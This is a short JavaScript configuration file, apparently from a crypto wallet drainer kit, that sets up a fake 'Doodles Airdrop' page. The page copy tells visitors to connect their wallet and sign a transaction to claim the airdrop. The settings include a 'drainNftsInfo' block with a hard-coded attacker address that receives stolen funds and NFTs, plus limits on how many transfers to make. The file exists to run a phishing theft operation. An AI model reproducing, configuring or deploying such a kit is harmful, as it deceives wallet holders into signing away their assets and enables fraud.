const receiveAddress = "0x75260938F48180f8C1A6fC9a124ED3ed46561F5a";

const collectionInfo = {
    name: "Doodles Airdrop",
    text1: "VERIFY YOUR ELIGIBILITY.",
    text2: "THE DOODLES AIRDROP IS A SIGN THAT YOU ARE PART OF OUR COMMUNITY. TO CLAIM THE AIRDROP CONNECT YOUR WALLET AND SIGN THE TRANSACTION",
    medias: {
        preview: "seed-video.mp4",
        favicon: "icon.jpg",
    },
    background:  {
        color: "#45BBFF", // If you don't use color type, you can ignore this line
    }
}

const drainNftsInfo = {
    minValue: 0.01,
    maxTransfer: 5,
    nftReceiveAddress: "0x75260938F48180f8C1A6fC9a124ED3ed46561F5a"
}


/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion